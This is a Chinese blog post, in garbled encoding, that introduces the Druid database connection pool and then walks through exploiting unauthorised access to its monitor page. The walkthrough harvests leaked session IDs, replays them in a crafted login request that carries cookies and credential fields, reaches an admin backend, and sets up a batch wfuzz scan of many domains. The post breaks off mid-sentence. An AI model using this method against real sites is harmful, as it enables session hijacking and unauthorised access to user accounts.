        <content type="html"><![CDATA[<h1 id="ä¸€ã€Druidç®€ä»‹"><a href="#ä¸€ã€Druidç®€ä»‹" class="headerlink" title="ä¸€ã€Druidç®€ä»‹"></a>ä¸€ã€Druidç®€ä»‹</h1><p><strong>Druid</strong> æ˜¯ç”±é˜¿é‡Œå·´å·´å¼€å‘çš„ä¸€ä¸ªé«˜æ€§èƒ½ã€åˆ†å¸ƒå¼çš„æ•°æ®åº“è¿æ¥æ± ï¼ˆDataSourceï¼‰ï¼Œä¸»è¦ç”¨äº Java åº”ç”¨ç¨‹åºä¸­æ•°æ®åº“è¿æ¥çš„ç®¡ç†å’Œä¼˜åŒ–ã€‚Druid åœ¨åŠŸèƒ½ã€æ€§èƒ½ã€ç¨³å®šæ€§å’Œç›‘æ§æ–¹é¢è¡¨ç°çªå‡ºï¼Œæ˜¯ç›®å‰ Java å¼€å‘ä¸­å¸¸ç”¨çš„æ•°æ®åº“è¿æ¥æ± ä¹‹ä¸€ã€‚</p><blockquote><p><strong>1ï¼‰ä»€ä¹ˆæ˜¯æ•°æ®åº“è¿æ¥æ± ï¼Ÿ</strong></p><p><strong>æ•°æ®åº“è¿æ¥æ± ï¼ˆDatabase Connection Poolï¼‰</strong> æ˜¯ä¸€ç§ç”¨äºç®¡ç†å’Œä¼˜åŒ–æ•°æ®åº“è¿æ¥çš„æŠ€æœ¯ï¼Œå®ƒé€šè¿‡<strong>å¤ç”¨</strong>ä¸€ç»„æ•°æ®åº“è¿æ¥ï¼Œå‡å°‘é¢‘ç¹åˆ›å»ºå’Œå…³é—­æ•°æ®åº“è¿æ¥çš„å¼€é”€ï¼Œä»è€Œæå‡åº”ç”¨ç¨‹åºä¸æ•°æ®åº“ä¹‹é—´çš„æ€§èƒ½å’Œç¨³å®šæ€§ã€‚</p><p><strong>2ï¼‰ä¸ºä»€ä¹ˆéœ€è¦æ•°æ®åº“è¿æ¥æ± ï¼Ÿ</strong></p><p>åœ¨ä¸æ•°æ®åº“äº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œå»ºç«‹ä¸€ä¸ªæ–°çš„æ•°æ®åº“è¿æ¥é€šå¸¸æ˜¯ä¸€ä¸ª<strong>å¼€é”€è¾ƒå¤§</strong>çš„æ“ä½œï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>åˆ›å»ºæ•°æ®åº“è¿æ¥å¯¹è±¡ã€‚</li><li>è¿›è¡Œç½‘ç»œé€šä¿¡ï¼ŒéªŒè¯èº«ä»½ã€‚</li><li>åˆ†é…èµ„æºï¼ˆå¦‚å†…å­˜ã€çº¿ç¨‹ï¼‰ã€‚</li><li>å…³é—­è¿æ¥ï¼Œé‡Šæ”¾èµ„æºã€‚</li></ol><p>å¦‚æœæ¯æ¬¡æ•°æ®åº“æ“ä½œéƒ½é‡æ–°å»ºç«‹è¿æ¥ï¼Œå°¤å…¶æ˜¯åœ¨<strong>é«˜å¹¶å‘ç¯å¢ƒ</strong>ä¸‹ï¼Œä¼šå¯¼è‡´ä»¥ä¸‹é—®é¢˜ï¼š</p><ul><li><strong>æ€§èƒ½ç“¶é¢ˆ</strong>ï¼šé¢‘ç¹å»ºç«‹å’Œé‡Šæ”¾è¿æ¥å ç”¨å¤§é‡ç³»ç»Ÿèµ„æºï¼Œå½±å“å“åº”é€Ÿåº¦ã€‚</li><li><strong>èµ„æºæµªè´¹</strong>ï¼šæ¯ä¸ªè¿æ¥éƒ½å ç”¨ä¸€å®šçš„å†…å­˜ã€CPUã€ç½‘ç»œèµ„æºï¼Œé¢‘ç¹æ“ä½œå¯èƒ½å¯¼è‡´èµ„æºè€—å°½ã€‚</li><li><strong>è¿æ¥æ³„æ¼</strong>ï¼šå¦‚æœè¿æ¥æœªåŠæ—¶å…³é—­ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®åº“è¿æ¥è€—å°½ï¼Œè¿›è€Œå¯¼è‡´åº”ç”¨ç¨‹åºå´©æºƒã€‚</li></ul><p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œ<strong>æ•°æ®åº“è¿æ¥æ± </strong>åº”è¿è€Œç”Ÿã€‚</p><p>3ï¼‰<strong>æ•°æ®åº“è¿æ¥æ± çš„å·¥ä½œåŸç†ï¼Ÿ</strong></p><ol><li><strong>åˆå§‹åŒ–è¿æ¥æ± </strong>ï¼šåº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œè¿æ¥æ± ä¼šåˆ›å»ºä¸€ç»„æ•°æ®åº“è¿æ¥å¹¶ä¿æŒå®ƒä»¬å¤„äºç©ºé—²çŠ¶æ€ã€‚è¿™äº›è¿æ¥ä¼šè¢«ç¼“å­˜ä»¥ä¾›é‡å¤ä½¿ç”¨ã€‚</li><li><strong>åˆ†é…è¿æ¥</strong>ï¼šå½“åº”ç”¨ç¨‹åºéœ€è¦ä¸æ•°æ®åº“äº¤äº’æ—¶ï¼Œä»è¿æ¥æ± ä¸­<strong>å–å‡ºä¸€ä¸ªç©ºé—²è¿æ¥</strong>ï¼Œè€Œä¸æ˜¯æ–°å»ºä¸€ä¸ªè¿æ¥ã€‚</li><li><strong>é‡Šæ”¾è¿æ¥</strong>ï¼šæ“ä½œå®Œæˆåï¼Œåº”ç”¨ç¨‹åºä¸ä¼šå…³é—­è¿æ¥ï¼Œè€Œæ˜¯å°†è¿æ¥<strong>å½’è¿˜åˆ°è¿æ¥æ± </strong>ï¼Œä¾›å…¶ä»–è¯·æ±‚é‡å¤ä½¿ç”¨ã€‚</li><li><strong>è¿æ¥ç»´æŠ¤</strong>ï¼šè¿æ¥æ± ä¼šå®šæœŸæ£€æµ‹ç©ºé—²è¿æ¥çš„çŠ¶æ€ï¼Œ<strong>ç§»é™¤æ— æ•ˆè¿æ¥</strong>ï¼Œå¹¶æ ¹æ®éœ€æ±‚åŠ¨æ€å¢åŠ æˆ–å‡å°‘è¿æ¥æ•°é‡ã€‚</li></ol><p>æ•°æ®åº“è¿æ¥æ± æ˜¯ç°ä»£ Java åº”ç”¨ç¨‹åºä¸­ä¸å¯æˆ–ç¼ºçš„ç»„ä»¶ï¼Œèƒ½å¤Ÿæ˜¾è‘—æå‡æ•°æ®åº“è®¿é—®æ€§èƒ½ã€èŠ‚çœèµ„æºï¼Œå¹¶æé«˜åº”ç”¨ç¨‹åºçš„å¹¶å‘èƒ½åŠ›ã€‚å¸¸è§çš„è¿æ¥æ± å®ç°å¦‚ Druidã€HikariCP ç­‰ï¼Œå·²ç»æˆä¸ºä¼ä¸šçº§å¼€å‘çš„æ ‡é…ã€‚</p></blockquote><h2 id="1-1-æ ¸å¿ƒåŠŸèƒ½"><a href="#1-1-æ ¸å¿ƒåŠŸèƒ½" class="headerlink" title="1.1 æ ¸å¿ƒåŠŸèƒ½"></a>1.1 æ ¸å¿ƒåŠŸèƒ½</h2><ol><li><p><strong>æ•°æ®åº“è¿æ¥æ± ç®¡ç†</strong><br>æä¾›äº†çµæ´»é«˜æ•ˆçš„æ•°æ®åº“è¿æ¥æ± ç®¡ç†ï¼Œæ”¯æŒå¤šç§æ•°æ®åº“ï¼ˆå¦‚ MySQLã€PostgreSQLã€Oracleã€SQL Server ç­‰ï¼‰ï¼Œå¹¶èƒ½å¤Ÿæœ‰æ•ˆç®¡ç†æ•°æ®åº“è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸã€‚</p></li><li><p><strong>SQL ç›‘æ§å’Œç»Ÿè®¡</strong><br>å†…ç½®äº†å¼ºå¤§çš„ SQL ç›‘æ§åŠŸèƒ½ï¼Œèƒ½å¤Ÿè®°å½• SQL æ‰§è¡Œæƒ…å†µã€æ…¢æŸ¥è¯¢ã€æ‰§è¡Œæ—¶é—´ã€é”™è¯¯ç­‰ä¿¡æ¯ï¼Œå¸®åŠ©å¼€å‘è€…ä¼˜åŒ– SQL æ€§èƒ½ã€‚</p><p>ï¼ˆç›‘æ§SQLçš„æ‰§è¡Œæ—¶é—´ã€ç›‘æ§Web URIçš„è¯·æ±‚ã€Sessionç›‘æ§ï¼‰</p></li><li><p><strong>SQL é˜²ç«å¢™</strong><br>æä¾›äº† SQL é˜²ç«å¢™åŠŸèƒ½ï¼Œå¯ä»¥é˜²æ­¢ SQL æ³¨å…¥æ”»å‡»å’Œä¸å®‰å…¨çš„ SQL æ“ä½œï¼Œç¡®ä¿æ•°æ®åº“çš„å®‰å…¨æ€§ã€‚</p></li><li><p><strong>é«˜æ•ˆçš„æ€§èƒ½</strong><br>Druid å¯¹è¿æ¥æ± æ€§èƒ½è¿›è¡Œäº†ä¼˜åŒ–ï¼Œç‰¹åˆ«æ˜¯åœ¨é«˜å¹¶å‘å’Œå¤§è§„æ¨¡åº”ç”¨åœºæ™¯ä¸‹ï¼Œå…·æœ‰æ›´å¥½çš„æ€§èƒ½å’Œç¨³å®šæ€§ã€‚</p></li><li><p><strong>å†…å­˜ç®¡ç†</strong><br>æä¾›äº†å¯¹å†…å­˜ä½¿ç”¨æƒ…å†µçš„ç›‘æ§å’Œç®¡ç†ï¼Œæ”¯æŒè‡ªåŠ¨æ¸…ç†æ— ç”¨è¿æ¥ï¼Œé™ä½å†…å­˜æ³„æ¼çš„é£é™©ã€‚</p></li><li><p><strong>æ‰©å±•æ€§å’Œçµæ´»æ€§</strong><br>Druid æä¾›äº†ä¸°å¯Œçš„é…ç½®é€‰é¡¹ï¼Œæ”¯æŒå¤šç§æ‰©å±•æœºåˆ¶ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®éœ€æ±‚è‡ªå®šä¹‰è¿æ¥æ± è¡Œä¸ºã€‚</p></li></ol><h2 id="1-2-Druid-çš„ç»„ä»¶"><a href="#1-2-Druid-çš„ç»„ä»¶" class="headerlink" title="1.2 Druid çš„ç»„ä»¶"></a>1.2 Druid çš„ç»„ä»¶</h2><ol><li><strong>DruidDataSource</strong>ï¼šæ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£æ•°æ®åº“è¿æ¥çš„ç®¡ç†ã€‚</li><li><strong>Druid Monitor</strong>ï¼šå†…ç½®çš„ Web ç›‘æ§é¡µé¢ï¼Œæä¾› SQL æ‰§è¡Œã€è¿æ¥æ± çŠ¶æ€ç­‰å®æ—¶ç›‘æ§æ•°æ®ã€‚</li><li><strong>Druid Filter</strong>ï¼šå¯è‡ªå®šä¹‰çš„è¿‡æ»¤å™¨é“¾ï¼Œæ”¯æŒç›‘æ§ã€æ—¥å¿—ã€SQL é˜²ç«å¢™ç­‰åŠŸèƒ½æ‰©å±•ã€‚</li></ol><h2 id="1-3-ä¸»è¦ä¼˜ç‚¹"><a href="#1-3-ä¸»è¦ä¼˜ç‚¹" class="headerlink" title="1.3 ä¸»è¦ä¼˜ç‚¹"></a>1.3 ä¸»è¦ä¼˜ç‚¹</h2><ul><li><strong>æ˜“ç”¨æ€§</strong>ï¼šé…ç½®ç®€å•ï¼Œé›†æˆæ–¹ä¾¿ã€‚</li><li><strong>é«˜æ€§èƒ½</strong>ï¼šå¯¹ JDBC æ“ä½œè¿›è¡Œäº†å¤šé¡¹ä¼˜åŒ–ï¼Œæå‡æ•°æ®åº“è®¿é—®é€Ÿåº¦ã€‚</li><li><strong>å¼ºå¤§çš„ç›‘æ§èƒ½åŠ›</strong>ï¼šå†…ç½®ç›‘æ§åŠŸèƒ½ï¼Œæ— éœ€é¢å¤–é…ç½®ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šå†…ç½® SQL é˜²ç«å¢™ï¼Œå‡å°‘å®‰å…¨éšæ‚£ã€‚</li></ul><h2 id="1-4-Druid-çš„ä½¿ç”¨åœºæ™¯"><a href="#1-4-Druid-çš„ä½¿ç”¨åœºæ™¯" class="headerlink" title="1.4 Druid çš„ä½¿ç”¨åœºæ™¯"></a>1.4 Druid çš„ä½¿ç”¨åœºæ™¯</h2><ul><li>å¤§å‹äº’è”ç½‘åº”ç”¨çš„æ•°æ®åº“è¿æ¥ç®¡ç†ã€‚</li><li>éœ€è¦é«˜å¹¶å‘è®¿é—®æ•°æ®åº“çš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚</li><li>éœ€è¦ç›‘æ§å’Œä¼˜åŒ– SQL æ€§èƒ½çš„ä¼ä¸šçº§åº”ç”¨ã€‚</li></ul><h1 id="äºŒã€Druidæœªæˆæƒè®¿é—®æ¼æ´"><a href="#äºŒã€Druidæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="äºŒã€Druidæœªæˆæƒè®¿é—®æ¼æ´"></a>äºŒã€Druidæœªæˆæƒè®¿é—®æ¼æ´</h1><p>åœ¨æ—¥å¸¸çš„å¨èƒå‘Šè­¦åˆ†æä¸­ç»å¸¸çœ‹åˆ°æœ‰æ”»å‡»è€…åœ¨ä½¿ç”¨æ‰«æå·¥å…·è¿›è¡Œdruidæœªæˆæƒè®¿é—®çš„æµ‹è¯•ï¼Œæ‰€ä»¥æƒ³å€Ÿæœºä¼šå­¦ä¹ ä¸€ä¸‹è¯¥æ¼æ´çš„æˆå› ã€ç‰¹å¾ã€å±å®³ã€åˆ©ç”¨æ–¹æ³•å’Œä¿®å¤æ–¹æ³•ã€‚</p><h2 id="2-1-æ¼æ´æˆå› "><a href="#2-1-æ¼æ´æˆå› " class="headerlink" title="2.1 æ¼æ´æˆå› "></a>2.1 æ¼æ´æˆå› </h2><p>Druidæœªæˆæƒè®¿é—®æ¼æ´æ˜¯ç”±äºå½“å¼€å‘è€…é…ç½®ä¸å½“ã€æƒé™æ§åˆ¶å¤±æ•ˆå¯¼è‡´çš„ã€‚</p><h2 id="2-2-æ¼æ´ç‰¹å¾"><a href="#2-2-æ¼æ´ç‰¹å¾" class="headerlink" title="2.2 æ¼æ´ç‰¹å¾"></a>2.2 æ¼æ´ç‰¹å¾</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.xxxx.com/druid/index.htmlhttps://****.bl******.com.cn/***-***-service/druid/index.htmlhttp://****.bl******.com.cn/***-****-view/<span class="token comment">#/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-3-æ¼æ´å±å®³"><a href="#2-3-æ¼æ´å±å®³" class="headerlink" title="2.3 æ¼æ´å±å®³"></a>2.3 æ¼æ´å±å®³</h2><p>é€šè¿‡DruidMonitoræœªæˆæƒè®¿é—®å¯è·å–ç®¡ç†å‘˜ä¿¡æ¯ã€‚</p><h2 id="2-4-æ¼æ´åˆ©ç”¨"><a href="#2-4-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.4 æ¼æ´åˆ©ç”¨"></a>2.4 æ¼æ´åˆ©ç”¨</h2><p>æ•´ä½“æ€è·¯ï¼šé€šè¿‡Druid Monitoræœªæˆæƒè®¿é—®æ‰¾åˆ°SESSIONç›‘æ§é¡µé¢ä¸‹é¢çš„ä¸€äº›SESSIONä¿¡æ¯å’ŒURIç›‘æ§ä¸‹çš„è·¯å¾„ï¼Œä»¥åŠé€šè¿‡é…åˆç›®æ ‡ç½‘ç«™å¤§æ•°æ®äº§å“å¹³å°çš„ç™»å½•ç­‰ä¸€ç³»åˆ—æµ‹è¯•ï¼Œå¯è·å¾—ä¸€èµ·ç®¡ç†å‘˜ä»¥åŠå…¶ä»–æ³¨å†Œæˆå‘˜ä¿¡æ¯ã€‚</p><h3 id="1ï¼‰æœªæˆæƒè®¿é—®index-htmlç•Œé¢"><a href="#1ï¼‰æœªæˆæƒè®¿é—®index-htmlç•Œé¢" class="headerlink" title="1ï¼‰æœªæˆæƒè®¿é—®index.htmlç•Œé¢"></a>1ï¼‰æœªæˆæƒè®¿é—®index.htmlç•Œé¢</h3><p>é¦–å…ˆï¼Œæ˜¯æœªæˆæƒçš„è®¿é—®ç•Œé¢ï¼Œä¸»è¦å…³æ³¨Sessionç›‘æ§å’ŒURIç›‘æ§è¿™ä¸¤ä¸ªåœ°æ–¹ï¼Œå¦‚å›¾ï¼š</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.51.05.png" alt="sessionç›‘æ§ä¿¡æ¯æ³„æ¼" style="zoom:50%;"><p>å­˜åœ¨å¤§é‡è¢«æ³„æ¼çš„sessionä¿¡æ¯åŠå…¶å¯¹åº”è®¿é—®çš„IPåœ°å€ã€‚ä¸ç®¡æ˜¯ç™»é™†æˆåŠŸçš„ï¼Œæ²¡ç™»é™†æˆåŠŸçš„ï¼Œè¿˜æ˜¯å¤±æ•ˆçš„éƒ½ä¼šå‚¨å­˜åœ¨è¿™é‡Œã€‚</p><p>ä¼˜å…ˆé€‰æ‹©æš´éœ²åœ¨äº’è”ç½‘çš„è¿›è¡Œåˆ©ç”¨ã€‚</p><h3 id="2ï¼‰é€šè¿‡sessionå®Œæˆæ”»å‡»é¢çš„æ‰©å±•"><a href="#2ï¼‰é€šè¿‡sessionå®Œæˆæ”»å‡»é¢çš„æ‰©å±•" class="headerlink" title="2ï¼‰é€šè¿‡sessionå®Œæˆæ”»å‡»é¢çš„æ‰©å±•"></a>2ï¼‰é€šè¿‡sessionå®Œæˆæ”»å‡»é¢çš„æ‰©å±•</h3><p>ä¾‹å¦‚æœ‰ä¸€äº›æ•æ„Ÿçš„SessionIdã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">0b055336<span class="token operator">-</span>85f8<span class="token operator">-</span>4bdc<span class="token operator">-</span><span class="token number">8008</span><span class="token operator">-</span>d45dc23c6b2f7a5681a1<span class="token operator">-</span>a790<span class="token operator">-</span>47fa<span class="token operator">-</span>948b<span class="token operator">-</span>a1f1a3532d09  3aaaa4d3<span class="token operator">-</span><span class="token number">1259</span><span class="token operator">-</span><span class="token number">4e64</span><span class="token operator">-</span>835d<span class="token operator">-</span>fb1f9bf35eda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åŒæ—¶ï¼ŒURIç›‘æ§çš„é¡µé¢ä¼šæ³„æ¼ä¸€äº›URIç™»å½•åœ°å€ï¼Œé€šè¿‡sessionæ›¿æ¢è¿›è¡Œç™»å½•ï¼Œè§‚å¯Ÿæ•ˆæœã€‚</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.55.49.png" alt="URIç›‘æ§ä¿¡æ¯æ³„æ¼" style="zoom:50%;"><p>å¦‚ï¼šmembership/index é¡µé¢ï¼Œæ„é€ æ•°æ®åŒ…è¿›è¡Œæµ‹è¯•ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">POST</span> <span class="token comment">/********-service/me****ship/index/ HTTP/1.1Host: *****.bl*******.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101Firefox/79.0Accept: application/json, text/plain, */</span><span class="token operator">*</span>Accept<span class="token operator">-</span>Language<span class="token operator">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>zh<span class="token operator">-</span><span class="token constant">TW</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span>zh<span class="token operator">-</span><span class="token constant">HK</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>en<span class="token operator">-</span><span class="token constant">US</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.2</span>Accept<span class="token operator">-</span>Encoding<span class="token operator">:</span> gzip<span class="token punctuation">,</span> deflateContent<span class="token operator">-</span>Type<span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span>Content<span class="token operator">-</span>Length<span class="token operator">:</span> <span class="token number">101</span><span class="token literal-property property">Origin</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token comment">/***p.********.com.c*Connection: closeReferer: http://*****.bl*******.com.cn/******-view/Cookie: Hm_lvt_ed752fa41bdfde359bfde28ccd27b888=1597904479,1597907505;sid=0b055336-85f8-4bdc-8008-d45dc23c6b2f;token=029d8a6ac03358de6e57c7254acbd017;username=80560478&amp;password=FSMBKxmUSkq9MfJjyAgyEA%3D%3D&amp;isCookieLogin=Y&amp;validationCode=anqr&amp;brand=999</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cookieä¸­çš„sidå‚æ•°ï¼Œå³ä¸ºsessioné‡Œé¢ç›‘æ§æ‰¾åˆ°çš„æ•°æ®ã€‚</p><p>BPåˆ†æè¯·æ±‚å’Œå“åº”ï¼š</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.59.42.png" alt="BPåˆ†æè¯·æ±‚å’Œå“åº”" style="zoom:50%;"><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.00.34.png" alt="BPåˆ†æè¯·æ±‚å’Œå“åº”" style="zoom:50%;"><p>å¯ä»¥å‘ç°ç”¨åœ¨Sessionç›‘æ§ä¸‹æ”¶é›†çš„æ•°æ®ï¼Œæ›¿æ¢è¿‡åï¼Œå¯ä»¥å¾—åˆ°ç”¨æˆ·åå’Œç”¨æˆ·IDã€‚</p><h3 id="3ï¼‰åˆ©ç”¨è·å–çš„ä¿¡æ¯ç™»å½•ç®¡ç†åå°"><a href="#3ï¼‰åˆ©ç”¨è·å–çš„ä¿¡æ¯ç™»å½•ç®¡ç†åå°" class="headerlink" title="3ï¼‰åˆ©ç”¨è·å–çš„ä¿¡æ¯ç™»å½•ç®¡ç†åå°"></a>3ï¼‰åˆ©ç”¨è·å–çš„ä¿¡æ¯ç™»å½•ç®¡ç†åå°</h3><p>æˆ‘ä»¬ä½¿ç”¨è·å–ç”¨æˆ·idï¼Œç™»å½•å¯¹åº”ç½‘ç«™çš„åå°/å…¶ä»–æ•æ„Ÿç³»ç»Ÿã€‚</p><p>å¯†ç éšä¾¿å¡«å†™ï¼ŒæŠ“åŒ…ï¼Œæ‰”åˆ°repeateræ¨¡å—ã€‚</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.04.34.png" alt="æŠ“åŒ…" style="zoom:50%;"><p>ä¸å‡ºæ„å¤–ä¼šæç¤ºå¯†ç é”™è¯¯ã€‚</p><p>æ­¤æ—¶ï¼Œå°†sessionidï¼ˆsidï¼‰æ›¿æ¢ä¸ºè·å–çš„sessionä¿¡æ¯ï¼Œusernameä¸ä¹‹å¯¹åº”çš„è´¦å·ã€‚</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.06.00.png" alt="æŠ“åŒ…æ›´æ”¹sessionid" style="zoom:50%;"><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.06.27.png" alt="æŠ“åŒ…æ›´æ”¹sessionid" style="zoom:50%;"><p>æœ€ç»ˆå¯ä»¥çœ‹åˆ°æˆåŠŸç™»å½•åˆ°åå°é¡µé¢ã€‚</p><h1 id="ä¸‰ã€æ‰¹é‡éªŒè¯Druidæœªæˆæƒè®¿é—®æ¼æ´"><a href="#ä¸‰ã€æ‰¹é‡éªŒè¯Druidæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="ä¸‰ã€æ‰¹é‡éªŒè¯Druidæœªæˆæƒè®¿é—®æ¼æ´"></a>ä¸‰ã€æ‰¹é‡éªŒè¯Druidæœªæˆæƒè®¿é—®æ¼æ´</h1><h2 id="3-1-åŸŸåæ”¶é›†"><a href="#3-1-åŸŸåæ”¶é›†" class="headerlink" title="3.1 åŸŸåæ”¶é›†"></a>3.1 åŸŸåæ”¶é›†</h2><p>ä½¿ç”¨Oneforallï¼ˆæŒ‚ä»£ç†ï¼‰æˆ–å…¶ä»–åŸŸåæœé›†å·¥å…·æ”¶é›†åŸŸåï¼Œæ”¶é›†å¥½çš„åŸŸåå­˜å…¥txtã€‚</p><h2 id="3-2-éªŒè¯åŸŸåå­˜æ´»æ€§"><a href="#3-2-éªŒè¯åŸŸåå­˜æ´»æ€§" class="headerlink" title="3.2 éªŒè¯åŸŸåå­˜æ´»æ€§"></a>3.2 éªŒè¯åŸŸåå­˜æ´»æ€§</h2><p>WFUZZè¿›ä¸€æ­¥éªŒè¯å­åŸŸåçš„å­˜æ´»æ€§</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wufzz <span class="token parameter variable">-w</span> å­åŸŸå.txt <span class="token parameter variable">--hw</span> <span class="token number">0</span> <span class="token parameter variable">--hc</span> <span class="token number">500,501</span>,502,504,505,400 <span class="token parameter variable">-Z</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-f</span> è¾“å‡º.txt --conn-delay <span class="token number">5</span> http://FUZZæ³¨æ„ï¼šä½¿ç”¨--conn-delay <span class="token number">5</span>ï¼šä¸ºè®¾ç½®è¶…æ—¶5ç§’åè·³è¿‡ï¼Œé»˜è®¤æ˜¯90ç§’ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>å‚æ•°è¯¦è§£ï¼š</p><p>è¿™æ¡å‘½ä»¤æ˜¯ä½¿ç”¨ <code>wufuzz</code> å·¥å…·è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼ˆfuzzingï¼‰çš„å‘½ä»¤è¡Œç¤ºä¾‹ã€‚<code>wufuzz</code> æ˜¯ä¸€ä¸ªåŸºäº Python çš„ç½‘ç»œæ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œç”¨äºè‡ªåŠ¨åŒ–å‘ç°Webåº”ç”¨ç¨‹åºä¸­çš„å®‰å…¨æ¼æ´ã€‚ä¸‹é¢æ˜¯å‘½ä»¤ä¸­å„ä¸ªå‚æ•°çš„å«ä¹‰ï¼š</p><ul><li><code>wufzz</code>ï¼šè¿™æ˜¯ <code>wufuzz</code> å·¥å…·çš„å‘½ä»¤è¡Œè°ƒç”¨ã€‚</li><li><code>-w å­åŸŸå.txt</code>ï¼šæŒ‡å®šä¸€ä¸ªåŒ…å«å­åŸŸåçš„æ–‡ä»¶ï¼Œ<code>wufuzz</code> å°†ä½¿ç”¨è¿™äº›å­åŸŸåä½œä¸ºæµ‹è¯•çš„è¾“å…¥ã€‚</li><li><code>--hw 0</code>ï¼š <code>--hw</code> å‚æ•°ç”¨äºéšè—å“åº”ä¸­å­—æ•°ç¬¦åˆæŒ‡å®šæ¡ä»¶çš„å“åº”ã€‚å…·ä½“æ¥è¯´ï¼Œ<code>--hw</code> å‚æ•°åé¢è·Ÿéšçš„æ˜¯ä¸€ä¸ªæ•°å­—æˆ–æ•°å­—èŒƒå›´ï¼Œè¡¨ç¤ºå¦‚æœå“åº”å†…å®¹çš„å­—æ•°ç­‰äºæˆ–è¶…è¿‡è¿™ä¸ªæ•°å­—æ—¶ï¼Œè¯¥å“åº”å°†è¢«éšè—ï¼Œä¸ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ã€‚<code>--hw 0</code> è¡¨ç¤ºéšè—æ‰€æœ‰å“åº”å†…å®¹å­—æ•°ä¸º0çš„å“åº”ã€‚è¿™é€šå¸¸æ„å‘³ç€æœåŠ¡å™¨æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ï¼Œå¯èƒ½æ˜¯æœåŠ¡å™¨é”™è¯¯æˆ–è€…è¯·æ±‚æ²¡æœ‰æˆåŠŸåˆ°è¾¾æœåŠ¡å™¨ã€‚è¿™ä¸ªå‚æ•°å¯¹äºåœ¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•æ—¶è¿‡æ»¤æ‰é‚£äº›æ²¡æœ‰å®é™…æ„ä¹‰çš„å“åº”æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œæ¯”å¦‚ç©ºå“åº”æˆ–è€…éå¸¸å¸¸è§çš„é”™è¯¯å“åº”ï¼Œä»è€Œä½¿æµ‹è¯•è€…èƒ½å¤Ÿæ›´ä¸“æ³¨äºé‚£äº›å¯èƒ½è¡¨æ˜æ½œåœ¨æ¼æ´æˆ–é…ç½®é”™è¯¯çš„å“åº”ã€‚</li><li><code>--hc 500,501,502,504,505,400</code>ï¼šæŒ‡å®šè¦å¿½ç•¥çš„ HTTP å“åº”ä»£ç ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>wufuzz</code> å°†å¿½ç•¥ 500ã€501ã€502ã€504ã€505 å’Œ 400 çŠ¶æ€ç çš„å“åº”ã€‚</li><li><code>-Z</code>ï¼šè¿™ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯ä½¿ <code>wufuzz</code> 